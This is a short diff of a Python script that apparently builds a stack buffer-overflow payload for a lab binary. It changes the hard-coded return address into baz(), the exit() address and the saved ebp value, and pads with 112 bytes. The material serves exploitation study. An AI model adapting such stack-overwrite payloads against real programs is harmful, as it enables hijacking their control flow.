@@ -4,9 +4,9 @@ import sys
 def tobytes (value):
    return (value).to_bytes(4,byteorder='little')
 
-baz_skip_addr  = 0x08048596  # Address of baz() + 3
+baz_skip_addr  = 0x080485b1  # Address of baz() + 3
 exit_addr      = 0xb7e369d0  # Address of exit()
-ebp_foo        = 0xbfffe4c8  # ebp value of the current stack frame
+ebp_foo        = 0xbfffeb48  # ebp value of the current stack frame
 
 content = bytearray(0xaa for i in range(112))
 
